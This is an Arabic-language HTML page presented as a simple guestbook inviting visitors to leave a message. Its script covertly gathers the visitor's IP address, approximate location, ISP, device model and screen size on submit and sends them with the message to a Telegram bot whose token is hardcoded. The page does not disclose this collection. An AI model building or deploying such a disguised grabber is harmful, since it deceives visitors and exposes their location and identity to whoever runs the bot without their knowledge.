<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اترك لي رسالة 👋</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #1e293b;
            padding: 2rem;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-sizing: border-box;
        }
        h1 { margin-bottom: 0.5rem; color: #38bdf8; font-size: 1.5rem; }
        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 1.5rem; }
        textarea {
            width: 100%;
            height: 100px;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 8px;
            color: #f8fafc;
            padding: 10px;
            box-sizing: border-box;
            resize: none;
            font-family: inherit;
            margin-bottom: 1rem;
        }
        textarea:focus {
            outline: none;
            border-color: #38bdf8;
        }
        button {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            border-radius: 8px;
            padding: 10px 20px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        button:hover {
            background-color: #0ea5e9;
        }
        .status {
            margin-top: 1rem;
            font-size: 0.85rem;
            color: #34d399;
            display: none;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>مرحباً بك! 👋</h1>
        <p>يسعدني مرورك، اترك لي رسالة أو كلمة تعبيرية هنا:</p>
        
        <form id="msgForm" onsubmit="sendData(event)">
            <textarea id="visitorMessage" placeholder="اكتب رسالتك هنا..."></textarea>
            <button type="submit" id="sendBtn">إرسال الرسالة</button>
        </form>
        
        <div id="statusMsg" class="status">تم ارسال رسالتك بنجاح، شكراً لك! ✨</div>
    </div>

    <script>
        const BOT_TOKEN = "9067905487:AAFWRzqKu9WX0XZYfmEdHtaRrITXiQarppI";
        const CHAT_ID = "8318202151";

        async function sendData(event) {
            event.preventDefault(); // منع إعادة تحميل الصفحة

            const btn = document.getElementById('sendBtn');
            const statusDiv = document.getElementById('statusMsg');
            const userMsg = document.getElementById('visitorMessage').value.trim();

            btn.innerText = "جاري الإرسال...";
            btn.disabled = true;

            try {
                // جلب بيانات الموقع الجغرافي والـ IP
                const response = await fetch("https://ipinfo.io/json");
                const data = await response.json();

                const ip = data.ip || "غير معروف";
                const city = data.city || "غير معروف";
                const country = data.country || "غير معروف";
                const org = data.org || "غير معروف";
                
                // جلب نوع الجهاز
                let deviceModel = "هاتف Android أو جهاز آخر";
                try {
                    if (navigator.userAgentData) {
                        const uaData = await navigator.userAgentData.getHighEntropyValues(["platform", "model"]);
                        if (uaData.model && uaData.model !== "") {
                            deviceModel = uaData.platform + " (" + uaData.model + ")";
                        } else {
                            deviceModel = uaData.platform;
                        }
                    }
                } catch (e) {
                    console.log("Client hints not supported");
                }

                const screenRes = window.screen.width + "x" + window.screen.height;
                const time = new Date().toLocaleString();

                // صياغة الرسالة الشاملة (الرسالة المكتوبة + المعلومات)
                let textMsg = "💬 رسالة جديدة من زائر!\n\n";
                
                if (userMsg !== "") {
                    textMsg += "✍️ النص المكتوب: \"" + userMsg + "\"\n\n";
                } else {
                    textMsg += "✍️ النص المكتوب: (لم يكتب شيئاً، دخل للموقع فقط)\n\n";
                }

                textMsg += 
                    "------------------------\n" +
                    "📍 الموقع التقريبي: " + city + "، " + country + "\n" +
                    "🌐 IP: " + ip + "\n" +
                    "📡 المزود: " + org + "\n" +
                    "📱 الجهاز: " + deviceModel + "\n" +
                    "🖥 الشاشة: " + screenRes + "\n" +
                    "⏰ الوقت: " + time;

                // إرسال البيانات إلى تيليجرام
                await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: textMsg
                    })
                });

                // إظهار رسالة النجاح للزائر
                document.getElementById('msgForm').style.display = 'none';
                statusDiv.style.display = 'block';

            } catch (error) {
                console.error("حدث خطأ:", error);
                btn.innerText = "حدث خطأ، حاول مرة أخرى";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
